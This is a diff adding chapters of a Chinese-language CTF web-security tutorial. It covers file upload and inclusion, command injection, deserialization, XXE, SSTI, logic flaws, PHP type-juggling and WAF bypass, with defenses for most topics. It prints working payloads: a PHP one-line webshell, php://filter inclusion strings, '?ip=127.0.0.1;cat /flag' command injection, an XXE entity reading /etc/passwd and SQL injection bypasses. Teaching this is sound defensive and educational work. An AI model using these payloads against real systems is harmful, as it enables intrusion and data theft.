+  <p><strong>常见协议</strong>：<code>file://</code>（读文件）、<code>gopher://</code>（构造任意 TCP 请求，威力大）、<code>dict://</code>、<code>http://</code>。</p>
+  <p><strong>防御</strong>：目标 URL 白名单；禁止私网 IP（127.0.0.1、10.x、192.168.x 等）；禁用危险协议；统一走代理并限制出网。</p>
+</section>
+
+<section id="c7">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 7 章</span>文件上传与文件包含</h2>
+  <p class="lead">这两个经常配合出击：<strong>文件上传</strong>是把恶意文件送上去，<strong>文件包含</strong>是让服务器把它执行/读出来。你上次解的那道 WarmUp 就是文件包含。</p>
+
+  <h3>7.1 文件上传漏洞</h3>
+  <p><strong>原理</strong>：网站允许上传文件，但没严格校验类型/内容。攻击者上传一个"木马"文件（如 PHP 一句话木马），再访问它，就能执行任意命令。</p>
+  <pre><code><span class="c">// 一句话木马（shell.php）</span>
+<span class="k">&lt;?php</span> <span class="f">eval</span>(<span class="v">$_POST</span>[<span class="s">'cmd'</span>]); <span class="k">?&gt;</span>
+<span class="c">// 上传后用蚁剑/菜刀连接，或 curl 提交：cmd=phpinfo();</span></code></pre>
+  <p><strong>常见校验与绕过</strong>：</p>
+  <table>
+    <tr><th>校验方式</th><th>绕过思路</th></tr>
+    <tr><td>前端 JS 校验扩展名</td><td>直接改包/关 JS，前端校验形同虚设</td></tr>
+    <tr><td>检查 Content-Type</td><td>Burp 改包把 <code>image/jpeg</code> 改成允许值</td></tr>
+    <tr><td>黑名单扩展名</td><td>用 <code>.php5 .phtml .Php</code>、双后缀 <code>.jpg.php</code>、<code>.htaccess</code></td></tr>
+    <tr><td>检查文件头</td><td>图片马：在真实图片后追加 PHP 代码（配合文件包含利用）</td></tr>
+    <tr><td>%00 截断</td><td>老版本 PHP：<code>shell.php%00.jpg</code></td></tr>
+  </table>
+  <p><strong>防御</strong>：白名单扩展名；重命名文件为随机名；上传目录禁止执行权限；检测文件内容；隔离存储。</p>
+
+  <h3>7.2 文件包含漏洞（你做过的那道）</h3>
+  <p><strong>原理</strong>：<code>include/require</code> 的文件名来自用户输入且未严格校验，导致能读/执行任意文件。回顾你解过的源码：</p>
+  <pre><code><span class="v">$whitelist</span> = [<span class="s">"source"</span>=&gt;<span class="s">"source.php"</span>, <span class="s">"hint"</span>=&gt;<span class="s">"hint.php"</span>];
+<span class="v">$_page</span> = <span class="f">mb_substr</span>(<span class="v">$page</span>,0,<span class="f">mb_strpos</span>(<span class="v">$page</span>.<span class="s">'?'</span>,<span class="s">'?</span>')); <span class="c">// 只截取 ? 前面校验</span>
+<span class="k">if</span> (<span class="f">in_array</span>(<span class="v">$_page</span>,<span class="v">$whitelist</span>)) <span class="k">return true</span>;
+...
+<span class="f">include</span> <span class="v">$_REQUEST</span>[<span class="s">'file'</span>];   <span class="c">// 却用了原始完整串 → 错位！</span></code></pre>
+  <p>核心矛盾（你已经掌握）：<strong>安检看的字符串 ≠ 实际执行的字符串</strong>。用 <code>source.php?../../../../ffffllllaaaagggg</code> 骗过白名单，include 却拿着完整串做了目录穿越。</p>
+
+  <h4>本地包含 LFI vs 远程包含 RFI</h4>
+  <ul>
+    <li><strong>LFI</strong>（Local）：包含服务器本地文件，如 <code>/etc/passwd</code>、日志文件。</li>
+    <li><strong>RFI</strong>（Remote）：当 <code>allow_url_include=On</code>，可包含远程 URL 上的木马，危害更大。</li>
+  </ul>
+
+  <h4>PHP 伪协议（文件包含的神器，必须掌握）</h4>
+  <table>
+    <tr><th>伪协议</th><th>用途</th></tr>
+    <tr><td><code>php://filter/read=convert.base64-encode/resource=xx.php</code></td><td><strong>读取 PHP 源码</strong>（Base64 编码输出，绕过执行）——CTF 超高频</td></tr>
+    <tr><td><code>php://input</code></td><td>把 POST 请求体当 PHP 代码执行（需 allow_url_include）</td></tr>
+    <tr><td><code>data://text/plain,&lt;?php...?&gt;</code></td><td>直接在 URL 里写 PHP 代码执行</td></tr>
+    <tr><td><code>file://</code></td><td>读本地绝对路径文件</td></tr>
+    <tr><td><code>phar://</code></td><td>配合 phar 反序列化（进阶）</td></tr>
+  </table>
+  <pre><code><span class="c"># 经典：读 flag.php 的源码（不执行，而是 base64 吐出来）</span>
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+<span class="c"># 拿到 base64 后解码即得源码里的 flag</span></code></pre>
+  <p><strong>防御</strong>：不允许用户控制 include 路径；用固定映射代替拼接；用 <code>realpath()</code> 校验真实路径是否在允许目录内；关闭 <code>allow_url_include</code>。</p>
+</section>
+
+<section id="c8">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 8 章</span>命令注入与代码执行</h2>
+
+  <h3>8.1 命令注入（Command Injection）</h3>
+  <p><strong>原理</strong>：Web 程序调用了系统命令，并把用户输入拼进去。攻击者用命令分隔符追加自己的命令。</p>
+  <pre><code><span class="c">// PHP 有问题的代码：ping 用户输入的 IP</span>
+<span class="v">$ip</span> = <span class="v">$_GET</span>[<span class="s">'ip'</span>];
+<span class="f">system</span>(<span class="s">"ping -c 3 "</span> . <span class="v">$ip</span>);</code></pre>
+  <p>传 <code>?ip=127.0.0.1;cat /flag</code>，实际执行的就是两条命令，flag 被打印出来。</p>
+  <p><strong>常见命令分隔符</strong>：</p>
+  <pre><code>;      <span class="c"># 顺序执行（最常用）</span>
+&amp;&amp;     <span class="c"># 前一个成功才执行后一个</span>
+||     <span class="c"># 前一个失败才执行后一个</span>
+|      <span class="c"># 管道，把前一个输出交给后一个</span>
+\n     <span class="c"># 换行（URL 编码 %0a）</span>
+$(...) 或 `...`  <span class="c"># 命令替换</span></code></pre>
+  <p><strong>空格被过滤的绕过</strong>：<code>${IFS}</code>、<code>%09</code>（Tab）、<code>&lt;</code>、<code>{cat,/flag}</code>。</p>
+  <p><strong>防御</strong>：不要用用户输入拼命令；用白名单校验；用 <code>escapeshellarg()</code>/<code>escapeshellcmd()</code> 转义；尽量避免调用系统命令。</p>
+
+  <h3>8.2 代码执行（RCE）</h3>
+  <p>比命令注入更直接：用户输入被当成<strong>程序代码</strong>执行。常见危险函数：</p>
+  <ul>
+    <li>PHP：<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code> 的 <code>/e</code> 模式、<code>create_function()</code>。</li>
+    <li>典型一句话木马 <code>&lt;?php eval($_POST['cmd']);?&gt;</code> 就是靠 eval 执行任意 PHP。</li>
+  </ul>
+  <div class="warn"><span class="bt">命令注入 vs 代码执行</span>
+  前者执行的是<strong>操作系统命令</strong>（cat、ls），后者执行的是<strong>编程语言代码</strong>（PHP、Python）。口试选择题爱考这个区别。</div>
+</section>
+
+<section id="c9">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 9 章</span>反序列化漏洞</h2>
+  <p class="lead">这是进阶内容，新手可以先理解概念，回头再啃。本质：<strong>程序把用户可控的数据反序列化成对象，触发了对象里的危险代码。</strong></p>
+
+  <h3>9.1 序列化与反序列化是什么</h3>
+  <p>序列化 = 把对象变成一串可存储/传输的字符串；反序列化 = 把这串字符串还原成对象。PHP 用 <code>serialize()</code> / <code>unserialize()</code>。</p>
+  <pre><code><span class="k">&lt;?php</span>
+<span class="k">class</span> User {
+    <span class="k">public</span> <span class="v">$name</span> = <span class="s">'guest'</span>;
+    <span class="k">function</span> <span class="f">__destruct</span>() { <span class="f">system</span>(<span class="v">$this</span>-&gt;name); }  <span class="c"># 对象销毁时执行命令</span>
+}
+<span class="c">// serialize(new User()) → O:4:"User":1:{s:4:"name";s:5:"guest";}</span>
+<span class="c">// 攻击者把 name 改成 "cat /flag"，程序 unserialize 后对象销毁触发 __destruct 执行命令</span>
+<span class="k">?&gt;</span></code></pre>
+
+  <h3>9.2 为什么会出问题</h3>
+  <p>PHP 有一批"<strong>魔术方法</strong>"（<code>__destruct</code>、<code>__wakeup</code>、<code>__toString</code>、<code>__construct</code> 等），会在特定时刻自动调用。如果攻击者能控制被反序列化的对象的属性，就能让自动调用的方法执行危险操作。</p>
+  <ul>
+    <li><strong>POP 链</strong>：当直接没有危险方法时，把多个类的方法串联起来达成目的，像搭链条一样，叫 Property-Oriented Programming 链。</li>
+    <li><strong>phar 反序列化</strong>：即使用不了 <code>unserialize()</code>，通过 <code>phar://</code> 协议读取特制 phar 文件也能触发反序列化，是常见绕过。</li>
+  </ul>
+
+  <h3>9.3 其他语言的反序列化</h3>
+  <p>Java（<code>ObjectInputStream</code>、 CommonsCollections 等 gadget 链）、Python（<code>pickle.loads</code>）、.NET 都有同类问题。 一旦发现反序列化点，常用工具 ysoserial（Java）、phpggc（PHP）生成 payload。</p>
+  <p><strong>防御</strong>：尽量不要反序列化不可信数据；用 JSON 等安全格式代替；白名单校验要反序列化的类；升级有漏洞的库。</p>
+</section>
+
+<section id="c10">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 10 章</span>XXE 与模板注入（SSTI）</h2>
+
+  <h3>10.1 XXE（XML 外部实体注入）</h3>
+  <p><strong>原理</strong>：程序解析用户提交的 XML，而 XML 允许定义"外部实体"引用外部资源。攻击者借此读文件、探测内网、造成拒绝服务。</p>
+  <pre><code><span class="k">&lt;?xml</span> version=<span class="s">"1.0"</span><span class="k">?&gt;</span>
+<span class="k">&lt;!DOCTYPE</span> foo [
+  <span class="k">&lt;!ENTITY</span> xxe SYSTEM <span class="s">"file:///etc/passwd"</span><span class="k">&gt;</span>
+<span class="k">]&gt;</span>
+<span class="k">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span>    <span class="c"># &amp;xxe; 处会替换成 /etc/passwd 的内容</span></code></pre>
+  <p><strong>危害</strong>：任意文件读取、SSRF（用 <code>http://</code> 实体）、盲 XXE、DoS（ billion laughs 攻击）。</p>
+  <p><strong>防御</strong>：禁用外部实体解析（PHP 用 <code>libxml_disable_entity_loader(true)</code>）；升级 XML 解析库；尽量不用 XML 处理不可信输入。</p>
+
+  <h3>10.2 SSTI（服务端模板注入）</h3>
+  <p><strong>原理</strong>：模板引擎（Jinja2、Twig、Smarty 等）把用户输入拼进模板一起解析，导致用户能用模板语法执行代码。判断是否 SSTI 的经典测试：</p>
+  <pre><code>输入 ${7*7} 或 {{7*7}} 或 &lt;%= 7*7 %&gt;   <span class="c"># 如果页面显示 49 → 存在 SSTI</span></code></pre>
+  <p>确认后利用模板的"沙箱逃逸"执行系统命令（如 Jinja2 通过 <code>__class__.__mro__</code> 找到 <code>subprocess.Popen</code>）。这是 CTF 里较难的题型，工具 fenjing 可辅助。</p>
+  <p><strong>防御</strong>：不要把用户输入当模板内容；模板与数据分离；使用模板引擎自带的沙箱并限制可用对象。</p>
+</section>
+
+<section id="c11">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 11 章</span>逻辑漏洞与认证缺陷</h2>
+  <p class="lead">这类漏洞不靠"注入代码"，而是利用<strong>业务流程设计上的疏忽</strong>——往往自动化工具扫不出来，靠人的思维。</p>
+
+  <h3>11.1 越权访问</h3>
+  <ul>
+    <li><strong>水平越权</strong>：改成别人的 ID 就能看/改同等级用户的数据（如 <code>?user_id=123</code> 改成 124）。</li>
+    <li><strong>垂直越权</strong>：普通用户能访问管理员功能（如直接访问 <code>/admin</code> 页面）。</li>
+  </ul>
+  <p>本质：服务器只验证了"你登录了"，没验证"你有没有权限操作这个资源"。</p>
+
+  <h3>11.2 未授权访问</h3>
+  <p>某些接口/后台不需要登录就能访问。比如直接访问管理页面、Swagger 文档、Actuator 端点、开放的 Redis/Docker API。</p>
+
+  <h3>11.3 认证与会话缺陷</h3>
+  <ul>
+    <li>弱口令、默认口令（admin/admin）。</li>
+    <li>验证码可绕过：前端校验、验证码不刷新、可复用、可识别。</li>
+    <li>Session 固定：登录前后 session id 不变，可被劫持。</li>
+    <li>JWT 缺陷：不校验签名、<code>alg:none</code> 攻击、弱密钥可爆破。</li>
+  </ul>
+
+  <h3>11.4 业务逻辑漏洞</h3>
+  <ul>
+    <li>支付：负数金额、改价格参数、重复提交订单、优惠券叠加。</li>
+    <li>抽奖/积分：并发请求、重放数据包。</li>
+    <li>密码找回：验证码爆破、改接收手机号、逻辑绕过直接重置他人密码。</li>
+  </ul>
+  <div class="deep"><span class="bt">CTF 里的常见考法</span>
+  逻辑题常考"改包"：用 Burp 抓下关键请求，逐一修改每个参数观察反应，理解服务端逻辑后找到绕过点。<strong>把每一个参数都当成可疑对象去试</strong>，是逻辑题的基本功。</div>
+  <p><strong>防御</strong>：每个请求都做服务端权限校验（永远不要信前端）；关键业务加服务端状态校验；敏感操作二次确认；做好会话管理。</p>
+</section>
+
+<section id="c12">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 12 章</span>其他常见漏洞</h2>
+
+  <h3>12.1 目录穿越（Directory Traversal）</h3>
+  <p>用 <code>../</code> 跳出预期目录读文件：<code>?file=../../../../etc/passwd</code>。常与文件下载、文件包含结合。防御：校验路径规范化后必须在允许目录内。</p>
+
+  <h3>12.2 任意文件读取 / 下载</h3>
+  <p>提供"下载文件"功能的接口，文件名参数可控且未校验：<code>?filename=../../etc/passwd</code>。防御：白名单 + 固定目录映射。</p>
+
+  <h3>12.3 条件竞争（Race Condition）</h3>
+  <p>利用多线程/并发，在"检查"和"使用"之间的时间差做手脚。经典场景：文件上传后、删除前的短暂窗口内访问文件；转账的并发重放。防御：加锁、原子操作。</p>
+
+  <h3>12.4 信息泄露</h3>
+  <p>各种"不该露出来却露了"的东西：</p>
+  <ul>
+    <li>源代码里的注释、硬编码的密码和密钥（你第一道题就是靠注释找到线索的）。</li>
+    <li><code>.git</code>、<code>.svn</code> 版本控制目录泄露（可用 githack 恢复源码）。</li>
+    <li>备份文件：<code>index.php.bak</code>、<code>.swp</code>、<code>www.zip</code>。</li>
+    <li>报错信息暴露路径、版本、SQL 语句。</li>
+    <li>目录列表开启、robots.txt 泄露敏感路径。</li>
+  </ul>
+
+  <h3>12.5 HTTP 相关</h3>
+  <ul>
+    <li><strong>HTTP 请求走私</strong>：利用前后服务器对请求边界理解不一致（Content-Length vs Transfer-Encoding）。</li>
+    <li><strong> Host 头攻击</strong>：篡改 Host 头影响密码重置链接、缓存投毒。</li>
+    <li><strong>CORS 配置错误</strong>：允许任意来源读取敏感数据。</li>
+  </ul>
+</section>
+
+<section id="c13">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 13 章</span>CTF Web 通用解题流程</h2>
+  <p class="lead">把前面所有知识串成一套可复用的动作清单。拿到任何一道 Web 题，按这个顺序走。</p>
+
+  <div class="flow">① 信息收集
+   - 打开页面，看源码（Ctrl+U）：注释、隐藏表单、JS 里的接口
+   - F12 看网络请求、响应头
+   - 扫目录（dirsearch）：找备份、.git、后台、其他页面
+   - 识别技术栈（Wappalyzer）：PHP？Java？什么框架？
+        ↓
+② 找入口
+   - 所有能传参的地方：URL 参数、表单、Cookie、HTTP 头、上传点
+   - 判断数据流：参数进了 SQL？HTML？文件路径？命令？模板？
+        ↓
+③ 判断漏洞类型
+   - 加引号看报错 → 疑似 SQL 注入
+   - 输出被回显到页面 → 疑似 XSS/SSTI
+   - 有文件读取/包含功能 → 疑似 LFI/任意文件读
+   - 有 ping/查询功能 → 疑似命令注入
+        ↓
+④ 构造 payload 验证并利用
+   - 由简到繁：先证明漏洞存在（弹窗/报错/延迟），再扩大战果
+        ↓
+⑤ 拿 flag 并提交</div>
+
+  <h3>几条实战心法</h3>
+  <ul>
+    <li><strong>先看懂程序在干什么，再动手。</strong>盲目 fuzz 效率低，代码审计（有源码时）往往一眼看穿。</li>
+    <li><strong>区分"过滤了什么"和"没过滤什么"。</strong>用二分思路测试：一个一个字符试，看哪些被拦截。</li>
+    <li><strong>善用报错。</strong>SQL 报错、PHP warning 会泄露大量信息。</li>
+    <li><strong>不要爆破 flag。</strong>拿 flag 靠的是逻辑漏洞和巧解，不是枚举字符——这也是你一开始就定的规矩，很好。</li>
+  </ul>
+</section>
+
+<section id="c14">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 14 章</span>PHP 特性与绕过技巧合集</h2>
+  <p class="lead">CTF Web 有大量"考语言特性"的题，这些是高频考点，集中放在这里当工具箱查。</p>
+
+  <h3>14.1 弱类型比较</h3>
+  <ul>
+    <li><code>==</code> 弱比较会类型转换，<code>===</code> 严格比较才安全。</li>
+    <li><code>"0e123" == "0e456"</code> 为 true——两边都被当成科学计数法的数字 0（MD5 值以 0e 开头经常用这个绕过）。</li>
+    <li><code>1 == "1abc"</code> 在 PHP5 为 true，PHP7 起为 false（版本差异要看环境，本题是 PHP5.6）。</li>
+    <li><code>null == false == 0 == "" == []</code> 都为真，绕过判断时有用。</li>
+  </ul>
+
+  <h3>14.2 常见函数陷阱</h3>
+  <ul>
+    <li><code>in_array($x, $arr)</code> 不传第三个 true 时是弱比较，可被类型转换绕过。</li>
+    <li><code>strcmp($a, $b)</code> 传数组时返回 NULL，<code>NULL == 0</code> 可绕过 <code>strcmp(...)==0</code>。</li>
+    <li><code>md5($a) == md5($b)</code> 用两个 MD5 后以 0e 开头的字符串（如 QNKCDZO 与 240610708）。</li>
+    <li><code>is_numeric()</code> 对 <code>%00</code>、科学计数法的处理差异。</li>
+    <li><code>preg_replace()</code> 的 <code>/e</code> 模式会把替换串当代码执行（PHP5）。</li>
+  </ul>
+
+  <h3>14.3 变量覆盖与提取</h3>
+  <ul>
+    <li><code>extract($_GET)</code> 可把 URL 参数直接变成变量，覆盖已有变量。</li>
+    <li><code>parse_str()</code>、<code>$$</code>（可变变量）也都可能造成变量覆盖。</li>
+  </ul>
+
+  <h3>14.4 绕过小结</h3>
+  <table>
+    <tr><th>场景</th><th>技巧</th></tr>
+    <tr><td>数字比较绕过</td><td>数组、0e 科学计数法、小数点、正负号</td></tr>
+    <tr><td>字符串黑名单</td><td>大小写、双写、注释分割、编码、等价函数</td></tr>
+    <tr><td>正则匹配</td><td>换行绕过 <code>^$</code>、%00 截断、回溯溢出</td></tr>
+    <tr><td>过滤空格</td><td><code>${IFS}</code>、<code>%09</code>、<code>/**/</code>、<code>%0a</code></td></tr>
+  </table>
+</section>
+
+<section id="c15">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 15 章</span>WAF 绕过与过滤规避思路</h2>
+  <p class="lead">当程序或 WAF 过滤了你的 payload，别慌，按下面的思路系统性地试。</p>
+  <ol>
+    <li><strong>先探测规则</strong>：逐个提交关键字/字符，看哪个被拦、怎么拦（返回 403 还是被清洗）。</li>
+    <li><strong>变换大小写</strong>：<code>SELECT</code> → <code>SeLeCt</code>。</li>
+    <li><strong>注释插入</strong>：<code>un/**/ion</code>、<code>sel/**/ect</code>。</li>
+    <li><strong>编码</strong>：URL 编码、双重编码、十六进制、Unicode、HTML 实体。</li>
+    <li><strong>双写</strong>：过滤一次 <code>select</code> 就写 <code>selselectect</code>。</li>
+    <li><strong>等价替换</strong>：<code>and</code>↔<code>&amp;&amp;</code>，<code>substr</code>↔<code>mid</code>，<code>sleep</code>↔<code>benchmark</code>。</li>
+    <li><strong>特殊字符/换行</strong>：<code>%0a</code>、<code>%00</code>、制表符、注释符。</li>
+    <li><strong>HTTP 参数污染（HPP）</strong>：同名参数传多次，前后 WAF 与应用取的可能是不同的值。</li>
+    <li><strong>分块传输</strong>：用 Transfer-Encoding: chunked 绕过某些 WAF 的检测。</li>
+  </ol>
+  <div class="tip"><span class="bt">心态</span>
+  绕过是"侦察 → 假设 → 验证"的循环，不是玄学。每次只改变一个变量，你才能知道是哪个技巧起了作用。</div>
+</section>
+
+<section id="c16">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 16 章</span>Web 解题的六种思维引擎</h2>
+  <p class="lead">前面十几章给了你"武器库"，但真正决定你能不能做出一道新题的，是拿到题时脑子里怎么转。这一章讲六种高手常用的思维引擎——遇到 Web 题时，它们会轮流启动，帮你把题从"看不懂"变成"一步步拆开"。</p>
+
+  <h3>引擎① 目标倒推：从 flag 往回走</h3>
+  <p>新手习惯从页面顺着往下做；高手常反过来想：<strong>flag 最终会出现在哪？谁有权读到它？我要构造什么输入才能让程序走到那一步？</strong>从终点往回铺路，目标清晰，不瞎忙。</p>
+  <div class="flow">终点：flag 显示在页面 / 写进文件 / 作为响应返回
+ ← 谁有权读它？（某个函数、参数、用户身份）
+   ← 怎么让程序走到那一步？（构造什么输入）
+     ← 现在手里有什么线索？</div>
+  <p>你做过的 WarmUp 题就用到了它：<code>hint.php</code> 说"flag 在 ffffllllaaaagggg 里"——终点明确了，于是你知道目标是构造一个"能读到那个文件"的输入。倒推把模糊的任务变成清晰的方向。</p>
+
+  <h3>引擎② 缩小战场：把大题切成一串小题</h3>
+  <p>一道题看起来难，是因为你把"拿下 flag"当成一个整体。高手的做法是不断切片，每一步只解决一个小问题：</p>
+  <ol>
+    <li>"我先不急着拿 flag，先确认<strong>这里到底有没有注入</strong>。"</li>
+    <li>"确认有注入，我先搞清楚<strong>是字符型还是数字型</strong>。"</li>
+    <li>"再定位<strong>哪一列能回显</strong>，然后才谈读数据。"</li>
+    <li>"能读数据了，最后找 <strong>flag 在哪张表哪个字段</strong>。"</li>
+  </ol>
+  <p>复杂问题不是被一次性解决的，而是被切成一串简单问题逐个吃掉的。每解决一个，未知就少一个。</p>
+
+  <h3>引擎③ 类比迁移：这题像我做过的哪道</h3>
+  <p>高手脑子里有个"题型库"，看到新题先检索："这个现象和我做过的哪道题像？像在哪、不像在哪？"</p>
+  <div class="tip"><span class="bt">关键</span>迁移的是<strong>思路结构</strong>，不是照搬 payload。比如你做过"问号截断的文件包含"，再遇到一道"参数被拼进路径"的题，就算表面不同，你也会想到"检查的和执行的是不是同一个值"——这就是把结构迁移过去，而不是死记一串字符。</div>
+
+  <h3>引擎④ 假设树：同时挂多个可能，用一次实验砍一片</h3>
+  <p>新手容易认定一个方向死磕；高手脑里是一棵树，用一个信息量最大的实验，一次排除多个分支。</p>
+  <div class="flow">现象：参数 id 可疑
+ ├─ 假设 A：数字型注入 → 试 id=1 and 1=2
+ ├─ 假设 B：字符型注入 → 试 id=1' and '1'='2
+ ├─ 假设 C：无注入/被参数化 → 试 id=abc 看是否报错
+ └─ 一个结果明确的实验，可同时排除多个分支</div>
+  <p>技巧：<strong>优先做那些"不管结果如何都能排除好几个假设"的实验</strong>，而不是只验证单一猜想的实验。比如 <code>?id=2-1</code> 一次就区分了"数字型/字符型"，比直接打一堆引号高效得多。</p>
+
+  <h3>引擎⑤ 反证证伪：主动找自己的错</h3>
+  <p>人天生爱"证实"——找到支持自己的证据就停工。高手反过来<strong>证伪</strong>："如果我判断错了，应该看到什么？我去看那个现象了吗？"</p>
+  <div class="note"><span class="bt">自检三问</span>① 有没有另一种解释也能说明我看到的？② 我是不是只挑了支持自己的证据？③ 什么现象会让我承认自己错了？<br>这一条专门对抗"我觉得过滤挺严"这类没验证就当成事实的思维定势。</div>
+
+  <h3>引擎⑥ 转换视角：换身份看同一道题</h3>
+  <p>卡住时强制换一个身份：</p>
+  <ul>
+    <li><strong>出题人视角</strong>：他想考什么？给这个提示是想引导我往哪走？</li>
+    <li><strong>开发者视角</strong>：如果我写这功能，哪里最可能偷懒没检查？</li>
+    <li><strong>攻击者视角</strong>：这数据若被我完全控制，最坏能让它干什么？</li>
+    <li><strong>正常用户视角</strong>：正常操作是怎样的？我偏离一步会怎样？</li>
+  </ul>
+  <p>视角一换，常能看到之前视而不见的东西——它改变的是你"关注什么"。</p>
+
+  <h3>六种引擎怎么配合</h3>
+  <table>
+    <tr><th>场景</th><th>优先调用的引擎</th></tr>
+    <tr><td>刚开始、一头雾水</td><td>目标倒推 + 观察（先搞清终点和起点）</td></tr>
+    <tr><td>问题看着很复杂</td><td>缩小战场（切片成小问题）</td></tr>
+    <tr><td>有几个可能方向</td><td>假设树 + 类比迁移（挂树、找像的题）</td></tr>
+    <tr><td>自以为想通了</td><td>反证证伪（主动找漏洞）</td></tr>
+    <tr><td>彻底卡住</td><td>转换视角（换身份看）</td></tr>
+  </table>
+  <div class="warn"><span class="bt">元认知</span>还要跳出来盯住自己：你现在处在"收集信息 / 假设验证 / 卡住"哪种状态？很多人卡了几小时都不知道自己在"卡住态"，还在假装验证里重复劳动。<strong>能诚实贴上"我卡住了"的标签，就是破局的第一步。</strong></div>
+</section>
+
+<section id="c17">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 17 章</span>Web 实战逐帧演示（含走弯路）</h2>
+  <p class="lead">前面都是道理。这一章把"高手怎么想"演给你看——每一帧写清：眼睛看到什么、脑子里冒出什么念头、手做了什么、为什么选这条路。特意保留了走弯路的帧，因为真实解题就是会犯错，关键是怎么把自己救出来。</p>
+
+  <h3>演示一：一道 SQL 注入题的完整思路</h3>
+  <p>题目：新闻页 <code>?id=1</code> 显示一篇新闻，目标是拿 flag。</p>
+  <div class="box">
+    <p><span class="pill">第 1 帧 · 观察</span></p>
+    <p><strong>看到</strong>：<code>?id=1</code>，页面显示"第 1 篇新闻"。</p>
+    <p class="deep"><strong>内心</strong>：id 是数字，直接决定显示内容——等于在喊"我可能被拼进 SQL 了"。头号嫌疑：SQL 注入。先记下，别急着动手，把源码和响应也扫一遍（可能 flag 直接藏在注释里）。</p>
+  </div>
+  <div class="box">
+    <p><span class="pill">第 2 帧 · 一次实验区分类型</span></p>
+    <p class="deep"><strong>内心</strong>：假设 A 数字型、B 字符型。试 <code>?id=2-1</code>：若仍显示第 1 篇，说明做了算术 → 数字型、无引号；若空或报错 → 字符型。这比上来打引号信息量大。</p>
+    <p><strong>结果</strong>：仍显示第 1 篇 → 数字型确认。</p>
+  </div>
+  <div class="box">
+    <p><span class="pill">第 3 帧 · 确认漏洞真存在</span></p>
+    <p><strong>动作</strong>：<code>?id=1 and 1=2</code>，预期页面变空；结果确实空了 → 输入被带进 SQL，注入点坐实。（数字型只是"可能"，这一步才确认。）</p>
+  </div>
+  <div class="box">
+    <p><span class="pill">第 4 帧 · 走弯路 + 自我纠错</span></p>
+    <p><strong>动作</strong>：急着 <code>order by</code> 猜列数、直接 union，结果一直报错。</p>
+    <p class="deep"><strong>内心</strong>：停。元认知自检——我是不是在瞎试？是的。我默认了"页面回显列数 = 查询列数"，没验证。反证一下：也许只回显其中一列。改用 <code>?id=-1 union select 1,2,3</code> 让原查询为空，看数字出现在哪。</p>
+    <p><strong>结果</strong>：页面显示"2" → 回显位是第 2 列。弯路就弯在"没先定位回显位就猜列数"。</p>
+  </div>
+  <div class="box">
+    <p><span class="pill">第 5 帧 · 缩小战场，逐级取信息</span></p>
+    <p><strong>动作</strong>：别一步想拿 flag——爆库名 → 表名 → 列名 → 数据，每级一个最小查询验证，每帧只多知道一件事。</p>
+  </div>
+  <div class="box">
+    <p><span class="pill">第 6 帧 · 拿旗与复盘</span></p>
+    <p><strong>动作</strong>：读出 flag。回过头记一条错题本套路：<em>union 注入先让原查询为空、先定位回显位，再谈猜列数。</em></p>
+  </div>
+  <div class="note"><span class="bt">这一整段里的思维</span>目标倒推（要拿到数据）、假设树（区分注入类型）、最小实验（一次一个变量）、元认知（第 4 帧发现自己在瞎试）、缩小战场（逐级取信息）、复盘（沉淀套路）——六种引擎协同工作。</div>
+
+  <h3>演示二：把"卡住—破局"完整走一遍</h3>
+  <p>题目：给了源码，审了半小时觉得过滤很严，找不到漏洞。下面是标准的破局流程：</p>
+  <div class="flow">【处境】审源码半小时无进展，反复看同几行。
+【第1步·识别状态】元认知自检：我处于"卡住态"。诚实承认，别自欺。
+【第2步·止损】停止继续读源码，按破局清单换视角。
+【第3步·反证前提】问自己："我是不是默认了'过滤很严'？它真的严吗？"
+【第4步·回到观察】重看过滤代码——发现它用黑名单挡了 "select"，
+   却没挡大小写混合 "SeLeCt" 和内联注释 "sel/**/ect"。
+   → 破局。原来卡的是"没被验证的假设被当成事实"。
+【第5步·验证】构造混合大小写输入 → 通过。
+【第6步·复盘】记一条：黑名单过滤要先测它漏了什么变体，
+   别凭"看着挺严"就放弃。</div>
+  <div class="warn"><span class="bt">核心</span>破局的关键动作不是"更努力地读源码"，而是<strong>怀疑自己的前提 + 回到观察</strong>。几乎所有卡壳，卡的都是某个没验证就被当成事实的假设。第 16 章的反证引擎和元认知，就是专治这个的。</div>
+
+  <h3>把思维练成本能</h3>
+  <ol>
+    <li><strong>一题多解</strong>：做出来后逼自己再找一种思路，打破"只会一条路"。</li>
+    <li><strong>讲给别人听</strong>：讲不清的地方，就是你没真正想通的地方。</li>
+    <li><strong>限时练习</strong>：给简单题设时间限制，训练快速观察和决策。</li>
+    <li><strong>出题思维</strong>：试着自己出题藏一个漏洞，能出题说明真懂了机制。</li>
+  </ol>
+  <p>读到这里，你的 Web 解题体系就完整了：第 13 章流程 → 第 14、15 章技巧 → 第 16 章思维引擎 → 第 17 章逐帧实战。剩下的就是做题——把这套思维在真实题上用起来，用一次内化一分。</p>
+</section>
+
+<section id="c18">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 18 章</span>防御体系与 OWASP Top 10</h2>
+  <p class="lead">会攻击更要懂防御。OWASP Top 10 是公认的 Web 安全风险排名，也是你面试必背的知识点。</p>
+
+  <h3>18.1 OWASP Top 10（2021 版）</h3>
+  <table>
+    <tr><th>编号</th><th>风险</th><th>对应本讲义章节</th></tr>
+    <tr><td>A01</td><td>失效的访问控制</td><td>第 11 章 越权/未授权</td></tr>
+    <tr><td>A02</td><td>加密机制失效</td><td>第 1 章 HTTPS、会话安全</td></tr>
+    <tr><td>A03</td><td>注入</td><td>第 4/8/10 章 SQLi、命令注入、XXE</td></tr>
